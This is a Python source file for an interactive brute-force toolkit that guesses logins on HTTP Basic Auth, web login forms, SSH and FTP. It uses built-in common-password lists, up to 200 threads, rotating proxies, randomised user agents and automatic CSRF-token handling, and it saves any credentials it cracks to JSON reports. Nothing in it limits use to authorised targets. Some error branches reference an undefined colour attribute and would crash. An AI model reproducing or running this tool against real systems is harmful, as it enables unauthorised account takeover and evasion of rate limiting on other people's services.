import os
import re
import sys
import time
import json
import uuid
import ftplib
import random
import threading
import socket
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.auth import HTTPBasicAuth
    requests.packages.urllib3.disable_warnings()
except ImportError:
    requests = None

try:
    import paramiko
except ImportError:
    paramiko = None


if os.name == "nt":
    os.system("")


# ══════════════════════════════════════════════════════════════
# COLORS
# ══════════════════════════════════════════════════════════════
class C:
    R      = '\033[0m'
    B      = '\033[1m'
    DIM    = '\033[2m'
    RED    = '\033[91m'
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    BLUE   = '\033[94m'
    CYAN   = '\033[96m'
    MAG    = '\033[95m'
    WHITE  = '\033[97m'
    GOLD   = '\033[38;2;255;215;0m'
    ORANGE = '\033[38;2;255;165;0m'
    PURPLE = '\033[38;2;191;64;255m'
    NEON   = '\033[38;2;0;255;213m'
    CRIM   = '\033[38;2;220;20;60m'
    AQUA   = '\033[38;2;0;255;255m'


ANSI_RE = re.compile(r'\033\[[0-9;]*m')


def vlen(s):
    return len(ANSI_RE.sub('', s))


def pad(s, w, align="left"):
    diff = max(w - vlen(s), 0)
    if align == "left":
        return s + " " * diff
    if align == "right":
        return " " * diff + s
    l = diff // 2
    return " " * l + s + " " * (diff - l)


# ══════════════════════════════════════════════════════════════
# DEFAULTS
# ══════════════════════════════════════════════════════════════
DEFAULT_USERS = [
    "admin", "root", "user", "test", "guest",
    "administrator", "oracle", "postgres", "tomcat", "jenkins",
]

DEFAULT_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "shadow", "master", "admin", "root",
    "toor", "pass", "test", "guest", "administrator",
    "welcome", "login", "changeme", "P@ssw0rd", "Password1",
]

LOCKOUT_SIGNALS = [
    "locked", "too many", "rate limit", "try again later",
    "temporarily blocked", "account suspended", "captcha",
]

CSRF_FIELD_NAMES = [
    "csrf_token", "csrfmiddlewaretoken", "_token", "authenticity_token",
    "csrf", "_csrf", "token", "csrfToken", "__RequestVerificationToken",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
]


# ══════════════════════════════════════════════════════════════
# PROXY
# ══════════════════════════════════════════════════════════════
def normalize_proxy(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "://" not in line:
        line = "http://" + line
    return line


def load_proxies_from_file(path):
    if not os.path.exists(path):
        return []
    out = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                p = normalize_proxy(line)
                if p:
                    out.append(p)
    except Exception:
        pass
    return out


def load_proxies_pasted():
    print(f"\n{C.NEON}Paste proxies{C.R} {C.DIM}(one per line, empty to finish){C.R}")
    proxies = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if not line.strip():
            if proxies:
                break
            continue
        p = normalize_proxy(line)
        if p:
            proxies.append(p)
            if len(proxies) % 100 == 0:
                print(f"{C.DIM}  ... {len(proxies)}{C.R}")
    return proxies


class ProxyPool:
    def __init__(self, proxies):
        self.proxies = [p for p in proxies if p]
        self.index = 0
        self.lock = threading.Lock()

    def get(self):
        if not self.proxies:
            return None
        with self.lock:
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1
        return {"http": p, "https": p}

    def count(self):
        return len(self.proxies)

def load_wordlist(path):
    if not os.path.exists(path):
        return None
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip()]
    except Exception:
        return None


def choose_wordlist(label, default_list):
    print(f"\n{C.NEON}{label}{C.R}")
    print(f"  {C.GOLD}1{C.R}  Default ({len(default_list)} entries)")
    print(f"  {C.GOLD}2{C.R}  From file")
    print(f"  {C.GOLD}3{C.R}  Type manually")
    print(f"{C.GOLD}>>{C.R} ", end="")
    ch = input().strip() or "1"

    if ch == "1":
        return default_list
    if ch == "2":
        p = input(f"{C.NEON}File path{C.R}: ").strip().strip('"').strip("'")
        d = load_wordlist(p)
        if not d:
            print(f"{C.CRIM}  empty or not found, using default{C.R}")
            return default_list
        return d
    if ch == "3":
        raw = input(f"{C.NEON}Values (comma separated){C.R}: ").strip()
        vals = [x.strip() for x in raw.split(",") if x.strip()]
        return vals if vals else default_list
    return default_list


def ask_common():
    print(f"\n{C.NEON}Threads{C.R} {C.DIM}(default 10, max 200){C.R}: ", end="")
    t = input().strip()
    threads = int(t) if t.isdigit() and 1 <= int(t) <= 200 else 10

    print(f"{C.NEON}Delay per attempt (sec){C.R} {C.DIM}(default 0.1){C.R}: ", end="")
    d = input().strip()
    try:
        delay = float(d) if d else 0.1
        delay = max(0.0, min(delay, 10.0))
    except ValueError:
        delay = 0.1

    print(f"{C.NEON}Stop after first hit?{C.R} {C.DIM}(y/n, default n - find all){C.R}: ", end="")
    stop_first = input().strip().lower() == "y"

    return threads, delay, stop_first


def ask_proxy():
    print(f"\n{C.NEON}Use rotating proxy?{C.R} {C.DIM}(y/n){C.R}: ", end="")
    if input().strip().lower() != "y":
        return None

    print(f"\n{C.NEON}Proxy source:{C.R}")
    print(f"  {C.GOLD}1{C.R}  File")
    print(f"  {C.GOLD}2{C.R}  Paste")
    print(f"{C.GOLD}>>{C.R} ", end="")
    mode = input().strip() or "1"

    proxies = []
    if mode == "1":
        path = input(f"{C.NEON}Proxy file{C.R}: ").strip().strip('"').strip("'")
        proxies = load_proxies_from_file(path)
    elif mode == "2":
        proxies = load_proxies_pasted()

    if not proxies:
        print(f"{C.CRIM}  no proxies loaded, using direct{C.R}")
        return None

    print(f"{C.GREEN}  loaded {len(proxies)} proxies{C.R}")
    return ProxyPool(proxies)


# ══════════════════════════════════════════════════════════════
# BRUTE FORCER
# ══════════════════════════════════════════════════════════════
class BruteForcer:
    def __init__(self, target, users, passwords, threads=10,
                 delay=0.1, proxy_pool=None, stop_first=False):
        self.target = target
        self.users = users
        self.passwords = passwords
        self.threads = threads
        self.delay = delay
        self.proxy_pool = proxy_pool
        self.stop_first = stop_first

        self.stop_flag = threading.Event()
        self.attempts = 0
        self.found = []
        self.lock = threading.Lock()
        self.print_lock = threading.Lock()

        self.total = len(users) * len(passwords)
        self.start_time = None
        self.lockout_detected = False
        self.rate_limited = False

        self._session = requests.Session() if requests else None
        if self._session:
            self._session.headers.update({
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            })

    def _proxies(self):
        return self.proxy_pool.get() if self.proxy_pool else None

    def _sleep(self):
        if self.delay > 0:
            time.sleep(self.delay)

    def _detect_lockout(self, text, status_code):
        if status_code in (423, 429):
            return True
        low = text.lower()
        for sig in LOCKOUT_SIGNALS:
            if sig in low:
                return True
        return False

    def _log(self, user, pw, success, extra=""):
        with self.lock:
            self.attempts += 1

            if success:
                self.found.append((user, pw))
                with self.print_lock:
                    print(f"\n{C.GREEN}{C.B}[+] FOUND: {user}:{pw}  "
                          f"({self.attempts}/{self.total}){C.R}")
                if self.stop_first:
                    self.stop_flag.set()
            else:
                if self.attempts % 20 == 0 or self.attempts == self.total:
                    bar_len = 30
                    filled = int(bar_len * self.attempts / self.total)
                    bar = "#" * filled + "-" * (bar_len - filled)
                    pct = int(100 * self.attempts / self.total)
                    tag = f" [proxy]" if self.proxy_pool and self.proxy_pool.count() else ""
                    if self.lockout_detected:
                        tag += f" {C.CRIM}[LOCKOUT!]{C.R}"
                    with self.print_lock:
                        sys.stdout.write(
                            f"\r  {C.NEON}[{bar}]{C.R} {C.GOLD}{pct:3d}%{C.R}  "
                            f"{C.DIM}try: {user}:{pw[:20]}{C.R}{tag}      "
                        )
                        sys.stdout.flush()

    def _extract_csrf(self, html):
        for name in CSRF_FIELD_NAMES:
            m = re.search(
                rf'name=["\']' + re.escape(name) + r'["\']\s+value=["\']([^"\']+)["\']',
                html, re.I
            )
            if m:
                return name, m.group(1)
            m = re.search(
                rf'value=["\']([^"\']+)["\']\s+name=["\']' + re.escape(name) + r'["\']',
                html, re.I
            )
            if m:
                return name, m.group(1)
        return None, None

    # ─── HTTP BASIC ───
    def try_http_basic(self, user, pw):
        if self.stop_flag.is_set() or not requests:
            return
        try:
            r = requests.get(
                self.target,
                auth=HTTPBasicAuth(user, pw),
                timeout=8, verify=False, allow_redirects=False,
                proxies=self._proxies(),
                headers={"User-Agent": random.choice(USER_AGENTS)},
            )
            ok = r.status_code == 200
            if not ok and self._detect_lockout(r.text, r.status_code):
                self.lockout_detected = True
                self.stop_flag.set()
        except Exception:
            ok = False
        self._log(user, pw, ok)
        self._sleep()

    # ─── HTTP FORM (with CSRF + baseline) ───
    def setup_http_form(self, target, uf, pf, success_str):
        """Baseline + CSRF token - call once before brute force"""
        self.uf = uf
        self.pf = pf
        self.success_str = success_str
        self.baseline_len = None
        self.csrf_name = None
        self.csrf_value = None

        try:
            r = self._session.get(target, timeout=8, verify=False,
                                  proxies=self._proxies())
            self.baseline_len = len(r.text)
            name, val = self._extract_csrf(r.text)
            if name:
                self.csrf_name = name
                self.csrf_value = val
                print(f"{C.GREEN}  [+] CSRF detected: {name}{C.R}")
            else:
                print(f"{C.DIM}  [*] No CSRF token detected{C.R}")
            print(f"{C.DIM}  [*] Baseline length: {self.baseline_len} bytes{C.R}")
        except Exception as e:
            print(f"{C.YEL}  [!] Baseline failed: {e}{C.R}")

    def try_http_form(self, user, pw):
        if self.stop_flag.is_set():
            return

        data = {self.uf: user, self.pf: pw}
        if self.csrf_name and self.csrf_value:
            data[self.csrf_name] = self.csrf_value

        try:
            r = self._session.post(
                self.target, data=data,
                timeout=8, verify=False, allow_redirects=True,
                proxies=self._proxies(),
            )

            # refresh CSRF if present
            if self.csrf_name:
                _, new_val = self._extract_csrf(r.text)
                if new_val:
                    self.csrf_value = new_val

            if self._detect_lockout(r.text, r.status_code):
                self.lockout_detected = True
                self.stop_flag.set()
                ok = False
            elif self.success_str:
                ok = self.success_str in r.text
            else:
                # heuristic: length diff + no invalid keywords
                length_diff = abs(len(r.text) - (self.baseline_len or 0))
                low = r.text.lower()
                has_error = any(k in low for k in [
                    "invalid", "incorrect", "wrong", "failed",
                    "try again", "not found", "denied",
                ])
                ok = (not has_error) and (length_diff > 50 or len(r.history) > 0)
        except Exception:
            ok = False

        self._log(user, pw, ok)
        self._sleep()

    # ─── SSH ───
    def try_ssh(self, user, pw):
        if self.stop_flag.is_set() or paramiko is None:
            return
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            host = self.target.split(":")[0]
            port = int(self.target.split(":")[1]) if ":" in self.target else 22
            client.connect(
                host, port=port, username=user, password=pw,
                timeout=6, banner_timeout=6, auth_timeout=6,
                allow_agent=False, look_for_keys=False,
            )
            ok = True
            client.close()
        except paramiko.AuthenticationException:
            ok = False
        except Exception:
            ok = False
        self._log(user, pw, ok)
        self._sleep()

    # ─── FTP ───
    def try_ftp(self, user, pw):
        if self.stop_flag.is_set():
            return
        try:
            host = self.target.split(":")[0]
            port = int(self.target.split(":")[1]) if ":" in self.target else 21
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=6)
            ftp.login(user, pw)
            ftp.quit()
            ok = True
        except Exception:
            ok = False
        self._log(user, pw, ok)
        self._sleep()

    def run(self, attempt_func):
        self.start_time = time.time()
        tasks = [(u, p) for u in self.users for p in self.passwords]

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(attempt_func, u, p) for u, p in tasks]
            for f in as_completed(futures):
                if self.stop_flag.is_set():
                    for fut in futures:
                        fut.cancel()
                    break

        elapsed = time.time() - self.start_time
        print()
        return self.found, elapsed, self.attempts

def banner():
    art = """▀█████████▄     ▄████████ ███    █▄      ███        ▄████████         ▄████████  ▄██████▄     ▄████████  ▄████████    ▄████████ 
  ███    ███   ███    ███ ███    ███ ▀█████████▄   ███    ███        ███    ███ ███    ███   ███    ███ ███    ███   ███    ███ 
  ███    ███   ███    ███ ███    ███    ▀███▀▀██   ███    █▀         ███    █▀  ███    ███   ███    ███ ███    █▀    ███    █▀  
 ▄███▄▄▄██▀   ▄███▄▄▄▄██▀ ███    ███     ███   ▀  ▄███▄▄▄           ▄███▄▄▄     ███    ███  ▄███▄▄▄▄██▀ ███         ▄███▄▄▄     
▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ███    ███     ███     ▀▀███▀▀▀          ▀▀███▀▀▀     ███    ███ ▀▀███▀▀▀▀▀   ███        ▀▀███▀▀▀     
  ███    ██▄ ▀███████████ ███    ███     ███       ███    █▄         ███        ███    ███ ▀███████████ ███    █▄    ███    █▄  
  ███    ███   ███    ███ ███    ███     ███       ███    ███        ███        ███    ███   ███    ███ ███    ███   ███    ███ 
▄█████████▀    ███    ███ ████████▀     ▄████▀     ██████████        ███         ▀██████▀    ███    ███ ████████▀    ██████████ 
               ███    ███                                                                    ███    ███                         """
    print(f"{C.RED}{C.B}{art}{C.R}")
    print(f"{C.NEON}{C.B}{'BRUTE FORCE TOOLKIT'.center(66)}{C.R}")
    print()


def menu():
    w = 50
    print(f"{C.PURPLE}+{'-' * w}+{C.R}")
    print(f"{C.PURPLE}|{C.R}{pad(f'{C.NEON}{C.B}TARGET TYPE{C.R}', w, 'center')}{C.PURPLE}|{C.R}")
    print(f"{C.PURPLE}+{'-' * w}+{C.R}")
    items = [
        ("1", "HTTP Basic Auth", C.NEON),
        ("2", "HTTP Form Login", C.BLUE),
        ("3", "SSH", C.PURPLE),
        ("4", "FTP", C.AQUA),
        ("0", "Exit", C.CRIM),
    ]
    for k, label, col in items:
        row = f"  {C.GOLD}{C.B}{k}{C.R}  {col}{label}{C.R}"
        print(f"{C.PURPLE}|{C.R}{pad(row, w)}{C.PURPLE}|{C.R}")
    print(f"{C.PURPLE}+{'-' * w}+{C.R}")


def show_summary(found, elapsed, attempts, target, proxy_count=0,
                 lockout=False, mode="unknown"):
    inner = 60
    print()
    print(f"{C.PURPLE}+{'-' * inner}+{C.R}")
    print(f"{C.PURPLE}|{C.R}{pad(f'{C.PURPLE}{C.B}RESULTS{C.R}', inner, 'center')}{C.PURPLE}|{C.R}")
    print(f"{C.PURPLE}+{'-' * inner}+{C.R}")

    rate = attempts / max(elapsed, 0.001)
    rows = [
        ("Target",  target[:40]),
        ("Mode",    mode),
        ("Attempts", str(attempts)),
        ("Time",    f"{elapsed:.2f}s"),
        ("Rate",    f"{rate:.1f} try/s"),
    ]
    if proxy_count:
        rows.append(("Proxies", str(proxy_count)))
    if lockout:
        rows.append(("Warning", f"{C.CRIM}LOCKOUT DETECTED{C.R}"))

    for k, v in rows:
        row = f"  {C.NEON}{k:<10}{C.R} {C.DIM}:{C.R} {C.WHITE}{v}{C.R}"
        print(f"{C.PURPLE}|{C.R}{pad(row, inner)}{C.PURPLE}|{C.R}")

    print(f"{C.PURPLE}+{'-' * inner}+{C.R}")

    if found:
        for u, p in found:
            row = f"  {C.GREEN}{C.B}[+]{C.R} {C.WHITE}{u}{C.R}:{C.CRIM}{p}{C.R}"
            print(f"{C.PURPLE}|{C.R}{pad(row, inner)}{C.PURPLE}|{C.R}")
    else:
        row = f"  {C.CRIM}no credentials found{C.R}"
        print(f"{C.PURPLE}|{C.R}{pad(row, inner)}{C.PURPLE}|{C.R}")

    print(f"{C.PURPLE}+{'-' * inner}+{C.R}")


def save_report(target, found, elapsed, attempts, mode, proxy_count=0):
    os.makedirs("output", exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    uniq = uuid.uuid4().hex[:6]
    path = f"output/bruteforce_{mode}_{ts}_{uniq}.json"

    data = {
        "target": target,
        "mode": mode,
        "time": datetime.now().isoformat(),
        "attempts": attempts,
        "elapsed_sec": round(elapsed, 2),
        "rate": round(attempts / max(elapsed, 0.001), 2),
        "proxy_count": proxy_count,
        "found": [{"user": u, "password": p} for u, p in found],
    }

    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

    print(f"{C.GREEN}{C.B}[+] Saved -> {path}{C.R}")


def finalize(found, elapsed, attempts, target, mode,
             proxy_count=0, lockout=False):
    show_summary(found, elapsed, attempts, target, proxy_count, lockout, mode)
    print(f"\n{C.GOLD}Save report?{C.R} {C.DIM}(y/n){C.R}: ", end="")
    if input().strip().lower() == "y":
        save_report(target, found, elapsed, attempts, mode, proxy_count)

def run_http_basic():
    target = input(f"{C.NEON}URL{C.R}: ").strip()
    if not target:
        print(f"{C.CRIM}URL required{C.R}")
        return
    users = choose_wordlist("Usernames", DEFAULT_USERS)
    passwords = choose_wordlist("Passwords", DEFAULT_PASSWORDS)
    threads, delay, stop_first = ask_common()
    pool = ask_proxy()

    bf = BruteForcer(target, users, passwords, threads, delay, pool, stop_first)
    pc = pool.count() if pool else 0

    print(f"\n{C.GOLD}Starting...{C.R}  ({bf.total} tries)\n")
    found, elapsed, attempts = bf.run(bf.try_http_basic)
    finalize(found, elapsed, attempts, target, "http_basic", pc, bf.lockout_detected)


def run_http_form():
    target = input(f"{C.NEON}URL{C.R}: ").strip()
    if not target:
        print(f"{C.CRIM}URL required{C.R}")
        return
    uf = input(f"{C.NEON}Username field{C.R} {C.DIM}(default: username){C.R}: ").strip() or "username"
    pf = input(f"{C.NEON}Password field{C.R} {C.DIM}(default: password){C.R}: ").strip() or "password"
    ss = input(f"{C.NEON}Success string{C.R} {C.DIM}(empty = auto heuristic){C.R}: ").strip()

    users = choose_wordlist("Usernames", DEFAULT_USERS)
    passwords = choose_wordlist("Passwords", DEFAULT_PASSWORDS)
    threads, delay, stop_first = ask_common()
    pool = ask_proxy()

    bf = BruteForcer(target, users, passwords, threads, delay, pool, stop_first)
    bf.setup_http_form(target, uf, pf, ss)

    pc = pool.count() if pool else 0
    print(f"\n{C.GOLD}Starting...{C.R}  ({bf.total} tries)\n")
    found, elapsed, attempts = bf.run(bf.try_http_form)
    finalize(found, elapsed, attempts, target, "http_form", pc, bf.lockout_detected)


def run_ssh():
    if paramiko is None:
        print(f"{C.CRIM}paramiko not installed: pip install paramiko{C.R}")
        return
    target = input(f"{C.NEON}Host:port{C.R} {C.DIM}(default port 22){C.R}: ").strip()
    if not target:
        print(f"{C.CRIM}target required{C.R}")
        return
    users = choose_wordlist("Usernames", DEFAULT_USERS)
    passwords = choose_wordlist("Passwords", DEFAULT_PASSWORDS)
    threads, delay, stop_first = ask_common()

    bf = BruteForcer(target, users, passwords, threads, delay, None, stop_first)
    print(f"\n{C.GOLD}Starting...{C.R}  ({bf.total} tries)\n")
    found, elapsed, attempts = bf.run(bf.try_ssh)
    finalize(found, elapsed, attempts, target, "ssh")


def run_ftp():
    target = input(f"{C.NEON}Host:port{C.R} {C.DIM}(default port 21){C.R}: ").strip()
    if not target:
        print(f"{C.CRIM}target required{C.R}")
        return
    users = choose_wordlist("Usernames", DEFAULT_USERS)
    passwords = choose_wordlist("Passwords", DEFAULT_PASSWORDS)
    threads, delay, stop_first = ask_common()

    bf = BruteForcer(target, users, passwords, threads, delay, None, stop_first)
    print(f"\n{C.GOLD}Starting...{C.R}  ({bf.total} tries)\n")
    found, elapsed, attempts = bf.run(bf.try_ftp)
    finalize(found, elapsed, attempts, target, "ftp")


# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════
def run():
    if not requests:
        print(f"{C.CRIM}requests not installed: pip install requests{C.R}")
        return

    while True:
        os.system("cls" if os.name == "nt" else "clear")
        banner()
        menu()
        print(f"\n{C.GOLD}{C.B}>>{C.R} ", end="")
        choice = input().strip() or "1"

        try:
            if choice == "0":
                print(f"{C.CRIM}{C.B}Bye{C.R}")
                break
            elif choice == "1":
                run_http_basic()
            elif choice == "2":
                run_http_form()
            elif choice == "3":
                run_ssh()
            elif choice == "4":
                run_ftp()
            else:
                print(f"{C.CRIM}Invalid{C.R}")
        except KeyboardInterrupt:
            print(f"\n{C.YEL}[!] Interrupted{C.R}")
        except Exception as e:
            print(f"\n{C.CRIM}[!] Error: {e}{C.R}")

        input(f"\n{C.DIM}Enter to continue{C.R}")


if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n{C.CRIM}Bye{C.R}")
